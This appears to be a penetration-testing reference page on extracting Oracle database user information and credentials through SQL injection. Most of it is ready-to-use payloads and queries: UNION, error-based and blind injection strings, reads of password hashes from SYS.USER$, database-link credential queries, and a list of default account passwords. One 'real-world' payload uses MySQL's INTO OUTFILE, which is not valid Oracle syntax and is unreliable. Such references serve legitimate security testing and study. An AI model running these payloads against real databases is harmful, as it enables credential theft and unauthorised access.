---
title: Database Credentials
description: How to extract Oracle database user credentials through SQL injection
category: Information Gathering
order: 4
tags: ["credentials", "users", "passwords"]
lastUpdated: 2025-03-15
---

## Database Credentials

Extracting database credentials is a critical objective in Oracle database penetration testing. Oracle secures credentials in various system tables with different levels of encryption depending on the version. This knowledge facilitates privilege escalation and lateral movement.

### System Tables with User Information

Oracle stores user credential information in several system tables and views:

| Table/View       | Description                         | Access Level Required |
| ---------------- | ----------------------------------- | --------------------- |
| `ALL_USERS`      | Basic user information              | Low (any user)        |
| `DBA_USERS`      | Detailed user information           | High (DBA role)       |
| `USER_USERS`     | Current user information            | Low (any user)        |
| `SYS.USER$`      | Raw user table with password hashes | Very High (SYS)       |
| `V$SESSION`      | Currently connected users           | Medium                |
| `V$PWFILE_USERS` | Database administrators             | Medium                |

### Current User Context

To retrieve information about the current database session:

```sql
-- Current username
SELECT USER FROM dual;

-- Current session details
SELECT username, osuser, machine, program FROM v$session WHERE audsid = USERENV('SESSIONID');

-- Current session privileges
SELECT * FROM session_privs;
```

### Listing Database Users

#### Basic User Enumeration (Low Privileges)

```sql
-- List all database users
SELECT username, account_status, created FROM all_users ORDER BY created DESC;

-- Count users by status
SELECT account_status, COUNT(*) FROM all_users GROUP BY account_status;

-- Find default users that haven't been locked
SELECT username, account_status FROM all_users
WHERE username IN ('SYS', 'SYSTEM', 'DBSNMP', 'MDSYS', 'OUTLN', 'SCOTT', 'FLOWS_FILES')
AND account_status = 'OPEN';
```

#### Detailed User Information (DBA Privileges)

```sql
-- Comprehensive user information (requires higher privileges)
SELECT username, account_status, profile, authentication_type,
       created, last_login, expiry_date, default_tablespace
FROM dba_users ORDER BY created DESC;

-- Find users with DBA privileges
SELECT grantee FROM dba_role_privs WHERE granted_role = 'DBA';
```

### Password Hashes

Oracle password hashes are stored in the `SYS.USER$` table, but format and accessibility vary by version:

```sql
-- Oracle 10g and earlier (unsalted hash format)
SELECT name, password FROM sys.user$ WHERE password IS NOT NULL;

-- Oracle 11g and later (uses salted SHA-1 format)
SELECT name, password, spare4 FROM sys.user$ WHERE password IS NOT NULL;

-- Oracle 12c and later (advanced encryption)
SELECT name, password AS versions_pw, spare4 AS pw12c FROM sys.user$ WHERE password IS NOT NULL;
```

### SQL Injection Examples

#### UNION Attacks for User Enumeration

```sql
-- Basic user listing via UNION attack
' UNION SELECT username,NULL FROM all_users--

-- More detailed information
' UNION SELECT username||'~'||account_status,NULL FROM all_users--
```

#### Error-Based Extraction

```sql
-- Extract user information through error messages
' AND CTXSYS.DRITHSX.SN(1,(SELECT username FROM all_users WHERE ROWNUM=1))=1--

-- Extract password hash if accessible
' AND CTXSYS.DRITHSX.SN(1,(SELECT password FROM sys.user$ WHERE name='SYSTEM'))=1--
```

#### Blind Extraction Techniques

```sql
-- Boolean-based blind
' AND (SELECT ASCII(SUBSTR(username,1,1)) FROM all_users WHERE ROWNUM=1)=83--

-- Time-based blind
' AND (CASE WHEN (SELECT ASCII(SUBSTR(username,1,1)) FROM all_users WHERE ROWNUM=1)=83
     THEN dbms_pipe.receive_message('x',10) ELSE NULL END) IS NULL--
```

### Default/Common Oracle User Accounts

Oracle databases often contain default accounts that may have weak or default passwords:

| Username  | Default Password                        | Description                      |
| --------- | --------------------------------------- | -------------------------------- |
| SYS       | CHANGE_ON_INSTALL, manager, oracle, sys | Super user account               |
| SYSTEM    | MANAGER, oracle, system                 | System administrator account     |
| SCOTT     | TIGER                                   | Demo account                     |
| DBSNMP    | DBSNMP                                  | Monitoring account               |
| ANONYMOUS | ANONYMOUS                               | Anonymous web access             |
| CTXSYS    | CTXSYS                                  | Oracle Text account              |
| MDSYS     | MDSYS                                   | Spatial data account             |
| OUTLN     | OUTLN                                   | Stored outlines for optimization |

### Oracle Database Link Credentials

Database links may contain embedded credentials that can be extracted:

```sql
-- List database links (may contain passwords)
SELECT * FROM all_db_links;

-- With higher privileges
SELECT * FROM dba_db_links;

-- Extract credentials from database links
SELECT owner, db_link, username, host, created
FROM all_db_links;
```

### Password Policies and Profiles

Understanding password policies can aid in guessing or cracking passwords:

```sql
-- List password verification functions
SELECT * FROM dba_profiles WHERE resource_name = 'PASSWORD_VERIFY_FUNCTION';

-- Check password lifetime settings
SELECT * FROM dba_profiles WHERE resource_name IN
('PASSWORD_LIFE_TIME', 'PASSWORD_GRACE_TIME', 'PASSWORD_REUSE_TIME');

-- Find user password settings
SELECT username, profile FROM dba_users;
```

### Advanced Credential Hunting

#### Finding Hard-coded Credentials in PL/SQL Code

```sql
-- Search for keywords in stored procedures
SELECT owner, name, text FROM all_source
WHERE UPPER(text) LIKE '%PASSWORD%' OR UPPER(text) LIKE '%CREDENTIALS%';

-- Look for encrypted strings that might be credentials
SELECT owner, object_name, text FROM all_source
WHERE text LIKE '%DBMS_CRYPTO%' OR text LIKE '%DBMS_OBFUSCATION_TOOLKIT%';
```

#### Exploring External Authentication Information

```sql
-- Check for externally authenticated users
SELECT username FROM dba_users WHERE authentication_type = 'EXTERNAL';

-- Check for globally authenticated users (like Active Directory)
SELECT username FROM dba_users WHERE authentication_type = 'GLOBAL';
```

### Real-world Attack Patterns

```sql
-- Chain of attacks for credential access
' UNION SELECT username,(SELECT password FROM sys.user$ WHERE name=username) FROM all_users--

-- Extract password hashes and export
' UNION SELECT username||':'||password,'x' FROM sys.user$ INTO OUTFILE '/tmp/oracle_hashes.txt'--

-- Look for PDBs in Oracle 12c+ (potential for additional credential sources)
' UNION SELECT name,open_mode FROM v$pdbs--
```
